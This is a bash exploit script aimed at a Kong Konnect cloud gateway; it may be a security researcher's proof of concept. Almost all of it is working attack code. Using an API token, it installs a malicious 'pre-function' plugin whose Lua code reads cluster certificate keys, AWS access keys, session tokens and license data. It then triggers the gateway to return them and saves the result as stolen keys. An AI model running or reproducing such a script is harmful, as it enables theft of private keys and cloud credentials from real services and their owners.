#!/bin/bash
# Kong Konnect Cloud - Full Private Key Exfiltration Exploit
# Target: Serverless Gateway (test)
# Proxy URL: https://kong-7e8e8991d8eup6ddo.kongcloud.dev
# Control Plane ID: 31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65

TOKEN="${TOKEN:-YOUR_TOKEN_HERE}"
CP_ID="31e9cc86-cf77-4fd9-ad4e-f2e6f1a9bf65"
PROXY_URL="https://kong-7e8e8991d8eup6ddo.kongcloud.dev"
API_URL="https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities"

echo "[*] Step 1: Verifying API access..."
RESPONSE=$(curl -s "${API_URL}/plugins" -H "Authorization: Bearer ${TOKEN}")
if echo "$RESPONSE" | grep -q "Unauthorized"; then
    echo "[!] ERROR: Token is invalid or expired. Get a new token!"
    exit 1
fi
echo "[+] API access verified"

echo "[*] Step 2: Creating malicious pre-function plugin..."
PLUGIN_RESPONSE=$(curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"=== KONG SECRETS EXFILTRATION ===\"}; local vars={\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\",\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\",\"AWS_SESSION_TOKEN\",\"KONG_LICENSE_DATA\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }')

PLUGIN_ID=$(echo "$PLUGIN_RESPONSE" | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
echo "[+] Plugin created with ID: $PLUGIN_ID"

echo "[*] Step 3: Waiting 20 seconds for plugin propagation..."
sleep 20

echo "[*] Step 4: Triggering exfiltration..."
echo "=== EXFILTRATED DATA ==="
curl -s "${PROXY_URL}/exploit"
echo ""
echo "========================"

echo "[*] Step 5: Saving stolen keys..."
mkdir -p stolen_keys_new

# Get raw response and extract keys
STOLEN=$(curl -s "${PROXY_URL}/exploit")
echo "$STOLEN" > stolen_data.txt

echo "[+] Exploitation complete! Check stolen_data.txt"
echo "[*] Plugin ID for cleanup: $PLUGIN_ID"
